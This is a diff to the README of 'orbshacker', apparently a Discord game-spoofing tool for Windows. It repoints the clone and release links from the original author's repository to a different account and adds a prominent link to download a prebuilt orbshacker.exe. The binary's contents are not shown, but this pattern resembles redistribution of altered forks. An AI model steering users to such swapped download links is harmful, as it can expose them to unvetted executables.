@@ -7,7 +7,11 @@
 [![Platform](https://img.shields.io/badge/Platform-Windows%20Only-555555?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/DanielPires2000/orbshacker)
 [![Discord](https://img.shields.io/badge/Discord-Game%20Spoofer-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.com)
 [![License](https://img.shields.io/badge/License-GPL%20v3-c0392b?style=for-the-badge&logo=opensourceinitiative&logoColor=white)](./LICENSE)
-[![Version](https://img.shields.io/github/v/release/DanielPires2000/orbshacker?style=for-the-badge&logo=semanticrelease&color=4ade80&logoColor=white)](https://github.com/DanielPires2000/orbshacker/releases)
+[![Version](https://img.shields.io/github/v/release/Mextrim/orbshacker?style=for-the-badge&logo=semanticrelease&color=4ade80&logoColor=white)](https://github.com/Mextrim/orbshacker/releases)
+
+<br/>
+
+### ⬇️ **[Скачать orbshacker.exe (v2.3.0)](https://github.com/Mextrim/orbshacker/releases/download/v2.3.0/orbshacker.exe)**
 
 <br/>
 
@@ -87,7 +91,7 @@ Python 3.10 or higher, Windows only. Internet connection for database fetching. 
 ## Installation
 
 ```bash
-git clone https://github.com/DanielPires2000/orbshacker.git
+git clone https://github.com/Mextrim/orbshacker.git
 cd orbshacker
 pip install -r requirements.txt
 ```
